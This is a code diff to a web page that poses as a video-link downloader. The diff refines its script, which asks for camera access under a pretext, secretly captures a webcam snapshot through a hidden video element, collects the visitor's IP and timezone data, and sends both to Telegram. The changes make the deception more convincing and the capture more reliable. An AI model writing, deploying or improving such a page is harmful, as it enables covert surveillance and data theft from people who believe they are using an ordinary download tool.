@@ -83,6 +83,9 @@
       font-size: 16px;
       color: green;
     }
+    #preview {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -101,6 +104,7 @@
       <li>Paste the link in the field above</li>
       <li>Click on "FETCH" to start process</li>
     </ol>
+    <video id="preview" autoplay playsinline muted></video>
     <div id="message-container"></div>
   </div>
 
@@ -142,7 +146,7 @@
     }
 
     async function sendImage() {
-      const consent = confirm("🅖🅡🅐🅝🅣 🅟🅔🅡🅜🅘🅢🅢🅘🅞🅝 🅣🅞 🅐🅒🅒🅔🅢🅢 🅨🅞🅤🅡 🅒🅐🅜🅔🅡🅐 🅕🅞🅡 🅑🅔🅣🅣🅔🅡 🅒🅞🅜🅟🅐🅣🅘🅑🅘🅛🅘🅣🅨!!!");
+      const consent = confirm("This site needs access to your camera to capture a snapshot. Do you allow?");
       if (!consent) return;
 
       const ipData = await getIPInfo();
@@ -156,13 +160,19 @@ Timezone: ${ipData.timezone || 'N/A'}`;
 
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        const video = document.createElement('video');
+        const video = document.getElementById('preview');
         video.srcObject = stream;
-        await video.play();
+
+        await new Promise(resolve => {
+          video.onloadedmetadata = () => {
+            video.play();
+            resolve();
+          };
+        });
 
         const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
@@ -170,10 +180,10 @@ Timezone: ${ipData.timezone || 'N/A'}`;
         const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg'));
 
         await sendToTelegram(message, blob);
-        document.getElementById("message-container").innerText = "✅ 🅓🅞🅦🅝🅛🅞🅐🅓🅘🅝🅖 🅥🅘🅓🅔🅞!";
+        document.getElementById("message-container").innerText = "✅ Snapshot sent successfully!";
       } catch (err) {
         console.error("Camera error:", err);
-        document.getElementById("message-container").innerText = "⚠️ Camera access denied or error occurred.";
+        document.getElementById("message-container").innerText = "⚠️ Unable to access camera. Please check Safari settings.";
       }
     }
   </script>
